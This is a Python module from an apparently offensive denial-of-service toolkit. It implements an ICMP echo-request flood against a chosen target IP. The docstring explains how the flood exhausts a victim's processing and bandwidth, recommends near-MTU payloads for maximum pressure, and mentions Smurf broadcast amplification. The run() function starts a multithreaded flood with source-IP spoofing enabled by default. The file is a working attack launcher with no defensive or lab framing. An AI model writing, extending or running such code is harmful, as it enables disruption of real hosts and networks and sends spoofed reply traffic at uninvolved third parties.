"""
modules/icmp_flood.py - PINGER
ICMP echo request flood. Targets ICMP processing stack and bandwidth.

How it works:
  Sends high-rate ICMP type 8 (echo request). Victim must:
  - Process each packet in kernel space
  - Allocate reply buffer (ICMP type 0)
  - Send ICMP reply (doubles effective bandwidth load)

  With spoofing: replies go to random IPs, victim generates outbound flood.
  Large payloads (up to 65507 bytes) maximize bandwidth consumption per packet.

Variants included:
  - Standard ping flood (56 byte payload, RFC compliant)
  - Large ICMP flood (1400 bytes, near-MTU)
  - Smurf (broadcast amplification - see packet_builder)
"""

from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


def run(
    dst_ip: str,
    payload_size: int = 56,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
) -> FloodEngine:
    """
    Launch ICMP echo flood.

    Args:
        dst_ip       : Target IP.
        payload_size : ICMP data payload in bytes. Max ~65507.
                       Use 1400 for near-MTU maximum pressure per packet.
        threads      : Worker count.
        pps_limit    : PPS cap.
        duration     : Duration in seconds.
        spoof        : Randomize source IP.

    Returns:
        FloodEngine instance (already started).
    """
    builder = PacketBuilder()

    def make_packet() -> bytes:
        return builder.icmp_echo(dst_ip, payload_size=payload_size, spoof=spoof)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
